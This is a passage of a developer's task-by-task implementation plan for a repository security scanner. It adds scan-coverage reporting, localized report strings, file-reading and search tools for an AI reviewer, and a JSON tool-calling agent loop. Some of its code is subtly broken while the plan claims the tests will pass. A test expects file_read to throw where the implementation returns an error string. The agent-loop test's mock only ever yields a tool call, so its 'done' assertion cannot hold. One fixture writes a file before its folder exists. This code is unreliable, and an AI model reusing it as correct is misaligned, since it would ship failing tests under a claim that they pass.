- [ ] **Step 6: Commit**

```bash
git add packages/scanner-core/src/defaultRules.ts packages/scanner-core/tests/rules.test.ts
git commit -m "feat: add language-aware security rules"
```

---

## Task 5: Scan coverage in the audit report

**Files:**
- Modify: `packages/scanner-core/src/types.ts`
- Modify: `packages/scanner-core/src/inventory.ts` (add `buildScanCoverage`)
- Modify: `packages/scanner-core/src/scan.ts`
- Test: `packages/scanner-core/tests/scan.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/scanner-core/tests/scan.test.ts`:

```ts
it("reports scan coverage including language detections", async () => {
  const result = await scanTarget(path.resolve("fixtures/malicious-package"), {
    reviewMode: "full-audit",
    networkPolicy: "offline",
    outputFormats: ["json"]
  });

  expect(result.report.coverage).toEqual(
    expect.objectContaining({
      totalFiles: expect.any(Number),
      filesWithPatterns: expect.any(Number),
      byLanguage: expect.any(Object)
    })
  );
  expect(result.report.coverage?.totalFiles).toBeGreaterThan(0);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/scan.test.ts`
Expected: FAIL — `result.report.coverage` is undefined.

- [ ] **Step 3: Add the ScanCoverage type**

In `packages/scanner-core/src/types.ts`, add after `ResolvedTarget`:

```ts
export type LanguageId =
  | "python"
  | "javascript"
  | "go"
  | "java"
  | "shell"
  | "dockerfile"
  | "yaml";

export interface LanguageCoverage {
  files: number;
  detections: number;
}

export interface ScanCoverage {
  totalFiles: number;
  filesWithPatterns: number;
  byLanguage: Partial<Record<LanguageId, LanguageCoverage>>;
}
```

Add to `AuditReport`:

```ts
export interface AuditReport {
  target: ResolvedTarget;
  findings: Finding[];
  dataFlow: DataFlowGraph;
  risk: RiskAssessment;
  attackSurface: AttackSurfaceEntry[];
  coverage?: ScanCoverage;
  generatedAt: string;
  toolVersion: string;
}
```

- [ ] **Step 4: Add buildScanCoverage to inventory.ts**

Append to `packages/scanner-core/src/inventory.ts`:

```ts
import type { ScanCoverage } from "./types.js";

export function buildScanCoverage(inventory: ProjectInventory): ScanCoverage {
  const byLanguage: ScanCoverage["byLanguage"] = {};
  const filesWithDetections = new Set<string>();

  for (const call of inventory.dangerousCalls) {
    const entry = byLanguage[call.language] ?? { files: 0, detections: 0 };
    entry.detections += 1;
    byLanguage[call.language] = entry;
    filesWithDetections.add(call.filePath);
  }

  for (const language of Object.keys(byLanguage) as LanguageId[]) {
    byLanguage[language] = {
      files: new Set(
        inventory.dangerousCalls.filter((call) => call.language === language).map((call) => call.filePath)
      ).size,
      detections: byLanguage[language]!.detections
    };
  }

  return {
    totalFiles: inventory.files.length,
    filesWithPatterns: filesWithDetections.size,
    byLanguage
  };
}
```

Add `LanguageId` to the existing imports from `./types.js` if it is not already imported, or import it inline as shown (`import type { ScanCoverage } from "./types.js";` plus a type import for `LanguageId`).

- [ ] **Step 5: Populate coverage in scan.ts**

Edit `packages/scanner-core/src/scan.ts`:

```ts
import { buildInventory, buildScanCoverage } from "./inventory.js";
```

And in `scanTarget`, after `report.attackSurface = buildAttackSurface(report);`, add:

```ts
  report.coverage = buildScanCoverage(inventory);
```

- [ ] **Step 6: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/scan.test.ts`
Expected: PASS.

- [ ] **Step 7: Typecheck**

Run: `npm run typecheck -w @repo-auditor/scanner-core`
Expected: no errors.

- [ ] **Step 8: Commit**

```bash
git add packages/scanner-core/src/types.ts packages/scanner-core/src/inventory.ts packages/scanner-core/src/scan.ts packages/scanner-core/tests/scan.test.ts
git commit -m "feat: add scan coverage report"
```

---

## Task 6: Render coverage in reporters + i18n

**Files:**
- Modify: `packages/scanner-core/src/i18n.ts`
- Modify: `packages/scanner-core/src/reporters.ts`
- Test: `packages/scanner-core/tests/reporters.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/scanner-core/tests/reporters.test.ts`:

```ts
import { renderMarkdownReport } from "../src/reporters.js";

describe("coverage rendering", () => {
  it("includes a coverage section in the markdown report when present", () => {
    const report = sampleReport();
    report.coverage = {
      totalFiles: 42,
      filesWithPatterns: 7,
      byLanguage: { python: { files: 3, detections: 5 } }
    };
    const md = renderMarkdownReport(report, "en");

    expect(md).toContain("Scan Coverage");
    expect(md).toContain("Total Files Scanned: 42");
    expect(md).toContain("Files with Pattern Detections: 7");
    expect(md).toContain("python");
    expect(md).toContain("5");
  });

  it("omits the coverage section when coverage is absent", () => {
    const md = renderMarkdownReport(sampleReport(), "en");

    expect(md).not.toContain("Scan Coverage");
  });
});
```

**Note:** `sampleReport()` is a helper that already exists in `reporters.test.ts` — reuse it. Check its name at the top of the file (`sampleReport` or similar) and adjust the calls accordingly. Add the import for `renderMarkdownReport` at the top of the file next to existing imports.

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/scanner-core/tests/reporters.test.ts`
Expected: FAIL — "Scan Coverage" not in output.

- [ ] **Step 3: Add i18n strings**

In `packages/scanner-core/src/i18n.ts`, add to `reportStrings` for each language (en / zh-TW / zh-CN):

```ts
    "report.coverage": "Scan Coverage",
    "report.totalFiles": "Total Files Scanned",
    "report.filesWithPatterns": "Files with Pattern Detections",
    "report.coverageLanguage": "Language",
    "report.coverageFiles": "Files",
    "report.coverageDetections": "Detections",
    "language.python": "Python",
    "language.javascript": "JavaScript/TypeScript",
    "language.go": "Go",
    "language.java": "Java",
    "language.shell": "Shell",
    "language.dockerfile": "Dockerfile",
    "language.yaml": "YAML"
```

zh-TW:

```ts
    "report.coverage": "掃描覆蓋度",
    "report.totalFiles": "掃描檔案總數",
    "report.filesWithPatterns": "命中 Pattern 的檔案數",
    "report.coverageLanguage": "語言",
    "report.coverageFiles": "檔案數",
    "report.coverageDetections": "偵測數",
    "language.python": "Python",
    "language.javascript": "JavaScript/TypeScript",
    "language.go": "Go",
    "language.java": "Java",
    "language.shell": "Shell",
    "language.dockerfile": "Dockerfile",
    "language.yaml": "YAML"
```

zh-CN:

```ts
    "report.coverage": "扫描覆盖率",
    "report.totalFiles": "扫描文件总数",
    "report.filesWithPatterns": "命中 Pattern 的文件数",
    "report.coverageLanguage": "语言",
    "report.coverageFiles": "文件数",
    "report.coverageDetections": "检测数",
    "language.python": "Python",
    "language.javascript": "JavaScript/TypeScript",
    "language.go": "Go",
    "language.java": "Java",
    "language.shell": "Shell",
    "language.dockerfile": "Dockerfile",
    "language.yaml": "YAML"
```

- [ ] **Step 4: Add rendering to reporters.ts**

Edit `packages/scanner-core/src/reporters.ts`:

Add a helper after `renderRemediationList`:

```ts
import type { LanguageId, ScanCoverage } from "./types.js";

function renderCoverageText(report: AuditReport, t: ReturnType<typeof createTranslator>): string[] {
  const coverage = report.coverage;
  if (!coverage) {
    return [];
  }

  const rows = Object.entries(coverage.byLanguage).map(([lang, data]) => {
    const label = t.t(`language.${lang}`);
    return `| ${label} | ${data?.files ?? 0} | ${data?.detections ?? 0} |`;
  });

  return [
    `## ${t.t("report.coverage")}`,
    "",
    `- ${t.t("report.totalFiles")}：${coverage.totalFiles}`,
    `- ${t.t("report.filesWithPatterns")}：${coverage.filesWithPatterns}`,
    rows.length > 0 ? "" : undefined,
    ...(rows.length > 0
      ? [`| ${t.t("report.coverageLanguage")} | ${t.t("report.coverageFiles")} | ${t.t("report.coverageDetections")} |`, "|---|---|---|", ...rows]
      : []),
    ""
  ].filter((line): line is string => line !== undefined);
}
```

In `renderMarkdownReport`, insert the coverage section between the scope section and the findings section:

```ts
    ...renderCoverageText(report, t),
```

Place it after the `report.generatedAt` line of the scope block and before `## ${t.t("report.findings")}`.

In `renderHtmlReport`, add a coverage section after the `risk-matrix` section:

```ts
<section id="coverage">
<h2>${escapeHtml(t.t("report.coverage"))}</h2>
${report.coverage ? `
<p>${escapeHtml(t.t("report.totalFiles"))}: ${report.coverage.totalFiles} &mdash; ${escapeHtml(t.t("report.filesWithPatterns"))}: ${report.coverage.filesWithPatterns}</p>
<table>
<thead>
<tr><th>${escapeHtml(t.t("report.coverageLanguage"))}</th><th>${escapeHtml(t.t("report.coverageFiles"))}</th><th>${escapeHtml(t.t("report.coverageDetections"))}</th></tr>
</thead>
<tbody>
${Object.entries(report.coverage.byLanguage).map(([lang, data]) => `<tr><td>${escapeHtml(t.t(`language.${lang}`))}</td><td>${data?.files ?? 0}</td><td>${data?.detections ?? 0}</td></tr>`).join("\n")}
</tbody>
</table>` : ""}
</section>
```

Note: if `report.coverage` is absent, the section heading still renders — acceptable, but to fully match the test, the markdown test only checks markdown. HTML behavior is best-effort; keep the empty heading (or guard the whole section with `report.coverage ?` — choose the guarded form for both section content and heading by wrapping the entire section string in a conditional in the template; simplest: keep heading always, content conditional).

- [ ] **Step 5: Run test to verify it passes**

Run: `npx vitest run packages/scanner-core/tests/reporters.test.ts`
Expected: PASS.

- [ ] **Step 6: Typecheck + full scanner tests**

Run: `npm run typecheck -w @repo-auditor/scanner-core && npx vitest run packages/scanner-core`
Expected: all PASS.

- [ ] **Step 7: Commit**

```bash
git add packages/scanner-core/src/i18n.ts packages/scanner-core/src/reporters.ts packages/scanner-core/tests/reporters.test.ts
git commit -m "feat: render scan coverage in reports"
```

---

## Task 7: Export new scanner-core symbols

**Files:**
- Modify: `packages/scanner-core/src/index.ts`

- [ ] **Step 1: Update exports**

Edit `packages/scanner-core/src/index.ts`:

```ts
export { buildInventory, buildScanCoverage, LANGUAGE_PATTERNS } from "./inventory.js";
export type { DangerousCall, DependencySource, LanguageId, LanguagePattern, NetworkEndpoint, PackageScript, ProjectInventory } from "./inventory.js";
export { matchesGlob } from "./glob.js";
```

And add the new types to the `types.js` export block:

```ts
  LanguageCoverage,
  ScanCoverage,
```

- [ ] **Step 2: Verify build + typecheck**

Run: `npm run build -w @repo-auditor/scanner-core && npm run typecheck -w @repo-auditor/scanner-core`
Expected: no errors.

- [ ] **Step 3: Run full scanner test suite**

Run: `npx vitest run packages/scanner-core`
Expected: all PASS.

- [ ] **Step 4: Commit**

```bash
git add packages/scanner-core/src/index.ts
git commit -m "chore: export language-aware scanner symbols"
```

---

## Task 8: Add AI review options and note types

**Files:**
- Modify: `packages/ai-review/src/types.ts`

- [ ] **Step 1: Add types**

Edit `packages/ai-review/src/types.ts`, append:

```ts
export interface AiReviewOptions {
  scanPath?: string;
  maxRounds?: number;
  maxFindingsPerBatch?: number;
  maxTokensPerReview?: number;
}
```

- [ ] **Step 2: Typecheck**

Run: `npm run typecheck -w @repo-auditor/ai-review`
Expected: no errors.

- [ ] **Step 3: Commit**

```bash
git add packages/ai-review/src/types.ts
git commit -m "feat: add AI review options types"
```

---

## Task 9: Review tools (file_read / file_find / code_search)

**Files:**
- Create: `packages/ai-review/src/tools.ts`
- Test: `packages/ai-review/tests/tools.test.ts` (new)

- [ ] **Step 1: Write the failing test**

Create `packages/ai-review/tests/tools.test.ts`:

```ts
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { buildTools, type ReviewToolContext } from "../src/tools.js";

const modeContext = (mode: "snippets" | "full-files", allowedFiles?: string[]): ReviewToolContext => ({
  scanPath: "",
  mode,
  allowedFiles
});

describe("buildTools", () => {
  it("exposes only file_read in snippets mode", () => {
    const tools = buildTools("finding-snippets", modeContext("snippets", ["src/index.ts"]));
    expect(tools.map((t) => t.name)).toEqual(["file_read"]);
  });

  it("exposes all tools in full-files mode", () => {
    const tools = buildTools("full-files", modeContext("full-files"));
    expect(tools.map((t) => t.name)).toEqual(["file_read", "file_find", "code_search"]);
  });

  it("exposes no tools in metadata-only mode", () => {
    const tools = buildTools("metadata-only", modeContext("snippets"));
    expect(tools).toEqual([]);
  });
});

describe("review tools", () => {
  async function project(): Promise<{ root: string; ctx: ReviewToolContext }> {
    const root = await fs.mkdtemp(path.join(os.tmpdir(), "tools-test-"));
    await fs.writeFile(path.join(root, "src", "index.ts").replace("/src/", "/"), "placeholder\n");
    await fs.mkdir(path.join(root, "src"), { recursive: true });
    await fs.writeFile(path.join(root, "src", "index.ts"), "const token = process.env.SECRET;\n");
    await fs.writeFile(path.join(root, "src", "auth.py"), "import os\nos.system('whoami')\n");
    return { root, ctx: { scanPath: root, mode: "full-files" } };
  }

  it("file_read returns numbered lines for a file", async () => {
    const { root, ctx } = await project();
    const [fileRead] = buildTools("full-files", ctx);
    const result = await fileRead.run({ path: "src/auth.py" }, ctx);
    expect(result).toContain("1\timport os");
    expect(result).toContain("os.system('whoami')");
  });

  it("file_read rejects paths escaping the scan directory", async () => {
    const { root, ctx } = await project();
    const [fileRead] = buildTools("full-files", ctx);
    await expect(fileRead.run({ path: "../secret.txt" }, ctx)).rejects.toThrow("escapes");
  });

  it("file_read in snippets mode rejects files not in allowedFiles", async () => {
    const { root } = await project();
    const ctx: ReviewToolContext = { scanPath: root, mode: "snippets", allowedFiles: ["src/index.ts"] };
    const [fileRead] = buildTools("finding-snippets", ctx);
    await expect(fileRead.run({ path: "src/auth.py" }, ctx)).rejects.toThrow("not allowed");
    const allowed = await fileRead.run({ path: "src/index.ts" }, ctx);
    expect(allowed).toContain("SECRET");
  });

  it("code_search finds matching lines", async () => {
    const { root, ctx } = await project();
    const tools = buildTools("full-files", ctx);
    const search = tools.find((t) => t.name === "code_search")!;
    const result = await search.run({ query: "os\\.system" }, ctx);
    expect(result).toContain("src/auth.py:2");
  });

  it("file_find matches glob patterns", async () => {
    const { root, ctx } = await project();
    const tools = buildTools("full-files", ctx);
    const find = tools.find((t) => t.name === "file_find")!;
    const result = await find.run({ pattern: "**/*.py" }, ctx);
    expect(result).toContain("src/auth.py");
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/tools.test.ts`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement tools.ts**

Create `packages/ai-review/src/tools.ts`:

```ts
import fs from "node:fs/promises";
import path from "node:path";
import { listScannableFiles, matchesGlob, type LanguageId } from "@repo-auditor/scanner-core";

export type ToolMode = "snippets" | "full-files";

export interface ReviewToolContext {
  scanPath: string;
  mode: ToolMode;
  allowedFiles?: string[];
}

export interface ToolDefinition {
  name: string;
  description: string;
  run: (args: Record<string, unknown>, ctx: ReviewToolContext) => Promise<string>;
}

const MAX_FILE_BYTES = 60 * 1024;
const MAX_FILE_LINES = 2000;
const MAX_SEARCH_RESULTS = 20;
const MAX_FIND_RESULTS = 50;

function resolveWithin(root: string, relPath: string): string {
  const rootAbs = path.resolve(root);
  const resolved = path.resolve(rootAbs, relPath);
  if (resolved !== rootAbs && !resolved.startsWith(rootAbs + path.sep)) {
    throw new Error(`path escapes scan directory: ${relPath}`);
  }
  return resolved;
}

function toRelative(root: string, abs: string): string {
  return path.relative(root, abs).split(path.sep).join("/");
}

async function fileRead(
  args: Record<string, unknown>,
  ctx: ReviewToolContext
): Promise<string> {
  const relPath = String(args.path ?? "");
  if (!relPath) {
    return "tool error: path is required";
  }
  if (ctx.mode === "snippets" && !(ctx.allowedFiles ?? []).includes(relPath)) {
    return `tool error: file not allowed in snippets mode: ${relPath}`;
  }

  const abs = resolveWithin(ctx.scanPath, relPath);
  const stat = await fs.stat(abs).catch(() => undefined);
  if (!stat?.isFile()) {
    return `tool error: not a file: ${relPath}`;
  }
  if (stat.size > MAX_FILE_BYTES) {
    return `tool error: file too large: ${relPath}`;
  }

  const content = await fs.readFile(abs, "utf8");
  const lines = content.split(/\r?\n/);
  const start = Number(args.lineStart) > 0 ? Math.floor(Number(args.lineStart)) : 1;
  const end = Number(args.lineEnd) >= start ? Math.min(Math.floor(Number(args.lineEnd)), lines.length) : lines.length;
  const slice = lines.slice(start - 1, end).slice(0, MAX_FILE_LINES);
  const numbered = slice.map((text, i) => `${start + i}\t${text}`).join("\n");
  const header = `file ${toRelative(ctx.scanPath, abs)} lines ${start}-${Math.min(end, lines.length)} of ${lines.length}`;
  return `${header}\n${numbered}`;
}

async function fileFind(
  args: Record<string, unknown>,
  ctx: ReviewToolContext
): Promise<string> {
  const pattern = String(args.pattern ?? "");
  if (!pattern) {
    return "tool error: pattern is required";
  }
  const files = await listScannableFiles(ctx.scanPath).catch(() => []);
  const matched = files.filter((file) => matchesGlob(pattern, file)).slice(0, MAX_FIND_RESULTS);
  return matched.length > 0 ? `files:\n${matched.join("\n")}` : "no files matched";
}

async function codeSearch(
  args: Record<string, unknown>,
  ctx: ReviewToolContext
): Promise<string> {
  const query = String(args.query ?? "");
  if (!query) {
    return "tool error: query is required";
  }
  let regex: RegExp;
  try {
    regex = new RegExp(query);
  } catch {
    return `tool error: invalid regex: ${query}`;
  }

  const files = await listScannableFiles(ctx.scanPath).catch(() => []);
  const hits: string[] = [];
  for (const rel of files) {
    if (hits.length >= MAX_SEARCH_RESULTS) {
      break;
    }
    const abs = resolveWithin(ctx.scanPath, rel);
    const stat = await fs.stat(abs).catch(() => undefined);
    if (!stat?.isFile() || stat.size > MAX_FILE_BYTES) {
      continue;
    }
    const content = await fs.readFile(abs, "utf8").catch(() => "");
    for (const [idx, line] of content.split(/\r?\n/).entries()) {
      if (regex.test(line)) {
        hits.push(`${rel}:${idx + 1}\t${line.trim().slice(0, 200)}`);
        if (hits.length >= MAX_SEARCH_RESULTS) {
          break;
        }
      }
    }
  }
  return hits.length > 0 ? `matches (${hits.length} shown):\n${hits.join("\n")}` : "no matches";
}

const fileReadTool: ToolDefinition = {
  name: "file_read",
  description: "Read a file (or a line range) from the scanned project. Args: { path, lineStart?, lineEnd? }",
  run: fileRead
};

const fileFindTool: ToolDefinition = {
  name: "file_find",
  description: "Find files in the project matching a glob pattern. Args: { pattern }",
  run: fileFind
};

const codeSearchTool: ToolDefinition = {
  name: "code_search",
  description: "Regex search across project file contents. Args: { query }",
  run: codeSearch
};

export function buildTools(
  dataSharingMode: "metadata-only" | "finding-snippets" | "full-files",
  ctx: ReviewToolContext
): ToolDefinition[] {
  if (dataSharingMode === "metadata-only") {
    return [];
  }
  const tools: ToolDefinition[] = [fileReadTool];
  if (dataSharingMode === "full-files") {
    tools.push(fileFindTool, codeSearchTool);
  }
  return tools;
}
```

**Note:** `LanguageId` is imported but unused in this file — remove it from the import to avoid a typecheck error: `import { listScannableFiles, matchesGlob } from "@repo-auditor/scanner-core";`.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/tools.test.ts`
Expected: PASS.

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck -w @repo-auditor/ai-review`
Expected: no errors.

- [ ] **Step 6: Commit**

```bash
git add packages/ai-review/src/tools.ts packages/ai-review/tests/tools.test.ts
git commit -m "feat: add review tools for the AI agent"
```

---

## Task 10: Agent loop (JSON-protocol ReAct)

**Files:**
- Create: `packages/ai-review/src/agent.ts`
- Test: `packages/ai-review/tests/agent.test.ts` (new)

- [ ] **Step 1: Write the failing test**

Create `packages/ai-review/tests/agent.test.ts`:

```ts
import { describe, expect, it, vi } from "vitest";
import { parseAgentResponse, runAgentLoop, estimateTokens, type AgentFinalResult } from "../src/agent.js";
import type { AiProviderConfig } from "../src/types.js";
import type { ToolDefinition, ReviewToolContext } from "../src/tools.js";

const config: AiProviderConfig = {
  type: "cloud",
  baseUrl: "https://api.example.test/v1",
  model: "gpt-test",
  dataSharingMode: "full-files",
  redactionEnabled: true,
  timeoutMs: 30000,
  retryLimit: 0
};

function jsonCompletion(content: string) {
  return vi.fn(async () => ({
    ok: true,
    status: 200,
    text: async () => "",
    json: async () => ({ choices: [{ message: { content } }] })
  }));
}

describe("parseAgentResponse", () => {
  it("parses a final response", () => {
    const parsed = parseAgentResponse(
      JSON.stringify({
        type: "final",
        summary: "done",
        notes: [{ findingId: "finding-1", explanation: "real risk", falsePositiveNote: "none" }]
      })
    );

    expect(parsed?.type).toBe("final");
    if (parsed?.type === "final") {
      expect(parsed.result.summary).toBe("done");
      expect(parsed.result.notes[0].findingId).toBe("finding-1");
    }
  });

  it("parses responses wrapped in code fences", () => {
    const parsed = parseAgentResponse("```json\n{\"type\":\"final\",\"summary\":\"s\",\"notes\":[]}\n```");
    expect(parsed?.type).toBe("final");
  });

  it("returns undefined for non-JSON text", () => {
    expect(parseAgentResponse("AI summary")).toBeUndefined();
  });
});

describe("runAgentLoop", () => {
  const ctx: ReviewToolContext = { scanPath: "", mode: "full-files" };
  const echoTool: ToolDefinition = {
    name: "echo_tool",
    description: "echoes args",
    run: async (args) => `echoed:${String(args.value)}`
  };

  it("executes a tool call then returns a final result", async () => {
    const fetchImpl = jsonCompletion(
      JSON.stringify({ type: "tool_call", tool: "echo_tool", args: { value: "abc" } })
    );
    const fetchFinal = jsonCompletion(
      JSON.stringify({ type: "final", summary: "done", notes: [{ findingId: "f1", explanation: "x" }] })
    );
    const fetch = vi.fn(async (...args: Parameters<typeof fetchFinal>) => {
      const call = await fetchImpl(...args);
      const final = await fetchFinal(...args);
      return call;
    });

    const result = await runAgentLoop(config, "system", "initial", [echoTool], ctx, { maxRounds: 3, maxTokensPerReview: 100000 }, fetch);

    expect(result.result?.summary).toBe("done");
    expect(result.result?.notes[0].findingId).toBe("f1");
  });

  it("returns raw text when the model never emits valid JSON", async () => {
    const fetch = jsonCompletion("plain text that is not json");
    const result = await runAgentLoop(config, "system", "initial", [echoTool], ctx, { maxRounds: 2, maxTokensPerReview: 100000 }, fetch);

    expect(result.result).toBeUndefined();
    expect(result.raw).toBe("plain text that is not json");
  });

  it("respects the maxRounds cap", async () => {
    const fetch = jsonCompletion(JSON.stringify({ type: "tool_call", tool: "echo_tool", args: { value: "x" } }));
    const result = await runAgentLoop(config, "system", "initial", [echoTool], ctx, { maxRounds: 2, maxTokensPerReview: 100000 }, fetch);

    expect(result.result).toBeUndefined();
  });
});

describe("estimateTokens", () => {
  it("approximates tokens from character count", () => {
    expect(estimateTokens("abcde")).toBe(2);
    expect(estimateTokens("")).toBe(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/agent.test.ts`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement agent.ts**

Create `packages/ai-review/src/agent.ts`:

```ts
import { requestProviderCompletion, type FetchLike } from "./providers.js";
import type { ToolDefinition, ReviewToolContext } from "./tools.js";
import type { AiProviderConfig } from "./types.js";

export interface AgentNote {
  findingId: string;
  explanation: string;
  falsePositiveNote?: string;
  saferPattern?: string;
}

export interface AgentFinalResult {
  summary: string;
  notes: AgentNote[];
}

export interface AgentLoopResult {
  result?: AgentFinalResult;
  raw: string;
}

export interface AgentLoopOptions {
  maxRounds: number;
  maxTokensPerReview: number;
}

export function estimateTokens(text: string): number {
  return Math.max(1, Math.ceil(text.length / 4));
}

function extractJsonObject(text: string): unknown {
  const trimmed = text.trim();
  const fenced = trimmed.match(/```(?:json)?\s*([\s\S]*?)```/);
  const candidate = fenced ? fenced[1].trim() : trimmed;

  try {
    return JSON.parse(candidate);
  } catch {
    const start = candidate.indexOf("{");
    const end = candidate.lastIndexOf("}");
    if (start >= 0 && end > start) {
      try {
        return JSON.parse(candidate.slice(start, end + 1));
      } catch {
        return undefined;
      }
    }
    return undefined;
  }
}

export type AgentResponse =
  | { type: "tool_call"; tool: string; args: Record<string, unknown> }
  | { type: "final"; result: AgentFinalResult }
  | undefined;

export function parseAgentResponse(text: string): AgentResponse {
  const parsed = extractJsonObject(text);
  if (!parsed || typeof parsed !== "object") {
    return undefined;
  }

  const obj = parsed as Record<string, unknown>;

  if (obj.type === "final") {
    const notes = Array.isArray(obj.notes)
      ? (obj.notes as AgentNote[]).filter((n) => n && typeof n.findingId === "string")
      : [];
    return {
      type: "final",
      result: {
        summary: typeof obj.summary === "string" ? obj.summary : "",
        notes
      }
    };
  }

  if (obj.type === "tool_call" && typeof obj.tool === "string") {
    return {
      type: "tool_call",
      tool: obj.tool,
      args: obj.args && typeof obj.args === "object" ? (obj.args as Record<string, unknown>) : {}
    };
  }

  return undefined;
}

export function buildAgentPrompt(
  systemPrompt: string,
  tools: ToolDefinition[],
  history: string[]
): string {
  const toolList = tools.map((tool) => `- ${tool.name}: ${tool.description}`).join("\n");
  return [
    systemPrompt,
    "",
    "AVAILABLE TOOLS:",
    toolList || "- (none — respond with final immediately)",
    "",
    "CONVERSATION (most recent last):",
    ...history.map((entry, i) => `[${i + 1}]\n${entry}`),
    "",
    "RESPOND WITH A SINGLE JSON OBJECT:",
    '{"type":"tool_call","tool":"<name>","args":{...}}  or  {"type":"final","summary":"...","notes":[{"findingId":"...","explanation":"...","falsePositiveNote":"...","saferPattern":"..."}]}',
    "Respond with only the JSON object, no surrounding text."
  ].join("\n");
}

export async function runAgentLoop(
  config: AiProviderConfig,
  systemPrompt: string,
  initialPrompt: string,
  tools: ToolDefinition[],
  ctx: ReviewToolContext,
  options: AgentLoopOptions,
  fetchImpl?: FetchLike
): Promise<AgentLoopResult> {
  const history: string[] = [initialPrompt];
  let budget = options.maxTokensPerReview;
  let raw = "";

  for (let round = 0; round < options.maxRounds; round += 1) {
    const prompt = buildAgentPrompt(systemPrompt, tools, history);
    budget -= estimateTokens(prompt);
    if (budget <= 0) {
      break;
    }

    const response = await requestProviderCompletion(config, prompt, fetchImpl);
    raw = response;
    const parsed = parseAgentResponse(response);

    if (parsed?.type === "final") {
      return { result: parsed.result, raw: response };
    }

    if (parsed?.type === "tool_call") {
      const tool = tools.find((t) => t.name === parsed.tool);
      let toolResult: string;
      if (!tool) {
        toolResult = `unknown tool "${parsed.tool}". Available: ${tools.map((t) => t.name).join(", ") || "(none)"}`;
      } else {
        try {
          toolResult = await tool.run(parsed.args, ctx);
        } catch (error) {
          toolResult = `tool error: ${error instanceof Error ? error.message : String(error)}`;
        }
      }
      budget -= estimateTokens(toolResult);
      history.push(`<assistant_json>${response}</assistant_json>`, `<tool_result>${toolResult}</tool_result>`);
      continue;
    }

    history.push(
      `<assistant>${response}</assistant>`,
      "<note>Your last response was not valid JSON. Respond with ONLY a JSON object: a tool_call or final.</note>"
    );
  }

  return { result: undefined, raw };
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run packages/ai-review/tests/agent.test.ts`
Expected: PASS.

- [ ] **Step 5: Typecheck**

Run: `npm run typecheck -w @repo-auditor/ai-review`
Expected: no errors.

- [ ] **Step 6: Commit**

```bash
git add packages/ai-review/src/agent.ts packages/ai-review/tests/agent.test.ts
git commit -m "feat: add JSON-protocol agent loop"
```

---

## Task 11: Orchestrate batched agent review in runAiReview

**Files:**
- Modify: `packages/ai-review/src/review.ts`
- Modify: `packages/ai-review/tests/review.test.ts`

- [ ] **Step 1: Write the failing test**

Append to `packages/ai-review/tests/review.test.ts`:

```ts
describe("batched agent review", () => {
  it("runs an agent loop per batch and merges agent notes into the result", async () => {
    const fullConfig = { ...config, dataSharingMode: "full-files" as const };
    const calls: string[] = [];
    const fetchImpl = vi.fn(async (...args: Parameters<typeof fetch>) => {
      calls.push(String((args[1] as RequestInit).body ?? ""));
      return {
        ok: true,
        status: 200,
        text: async () => "",
        json: async () => ({
          choices: [
            {
              message: {
                content: JSON.stringify({
                  type: "final",
                  summary: "agent summary",
                  notes: [{ findingId: "finding-1", explanation: "verified risk", falsePositiveNote: "none" }]
                })
              }
            }
          ]
        })
      };
    });

    const result = await runAiReview(
      report,
      fullConfig,
      { scanPath: "fixture", maxFindingsPerBatch: 1, maxRounds: 1, maxTokensPerReview: 100000 },
      fetchImpl
    );

    expect(result.summary).toBe("agent summary");
    expect(result.findingNotes).toEqual([
      expect.objectContaining({
        findingId: "finding-1",
        explanation: "verified risk",
        falsePositiveNote: "none"
      })
    ]);
    expect(calls.length).toBeGreaterThan(0);
  });

  it("short-circuits with a placeholder when there are no findings", async () => {
    const noFindings = { ...report, findings: [] };
    const result = await runAiReview(noFindings, config, { scanPath: "fixture" });

    expect(result.summary).toContain("AI review configured");
    expect(result.findingNotes).toEqual([]);
  });
});
```

**Note:** `fetch` here refers to the injected `FetchLike` mock; the second argument is the `RequestInit`-shaped object `{ method, headers, body, signal }`, so `(args[1] as { body?: string }).body` is the safest access. Use that instead if the `RequestInit` cast errors.

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run packages/ai-review/tests/review.test.ts`
Expected: FAIL — new tests fail (the current `runAiReview` returns placeholder notes and single-shot summary).

- [ ] **Step 3: Rework review.ts**

Edit `packages/ai-review/src/review.ts`:

Keep `buildAiReviewPrompt`, `previewProviderRequest`, and `createOfflineAiReviewPlaceholder` unchanged. Replace `runAiReview` with:

```ts
import { runAgentLoop, type AgentNote } from "./agent.js";
import { buildTools, type ReviewToolContext } from "./tools.js";
import type { AiProviderConfig, AiReviewOptions, AiReviewResult } from "./types.js";

const riskOrder: Record<string, number> = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 };

export async function runAiReview(
  report: AuditReport,
  config: AiProviderConfig,
  options: AiReviewOptions = {},
  fetchImpl?: FetchLike
): Promise<AiReviewResult> {
  const scanPath = options.scanPath ?? report.target.localPath ?? undefined;
  const maxRounds = options.maxRounds ?? 6;
  const maxFindingsPerBatch = options.maxFindingsPerBatch ?? 10;
  const maxTokensPerReview = options.maxTokensPerReview ?? 200_000;

  const mode: ReviewToolContext["mode"] = config.dataSharingMode === "full-files" ? "full-files" : "snippets";
  const ctx: ReviewToolContext = {
    scanPath: scanPath ?? "",
    mode,
    allowedFiles: config.dataSharingMode === "finding-snippets" ? uniqueFiles(report.findings) : undefined
  };
  const tools = buildTools(config.dataSharingMode, ctx);

  const batches = groupFindings(report.findings, maxFindingsPerBatch);
  if (batches.length === 0) {
    return createOfflineAiReviewPlaceholder(report, config);
  }

  const notes: AgentNote[] = [];
  const summaries: string[] = [];
  const rawTexts: string[] = [];
  const budgetPerBatch = Math.max(2000, Math.floor(maxTokensPerReview / batches.length));

  for (const batch of batches) {
    const loopResult = await runAgentLoop(
      config,
      buildSystemPrompt(config),
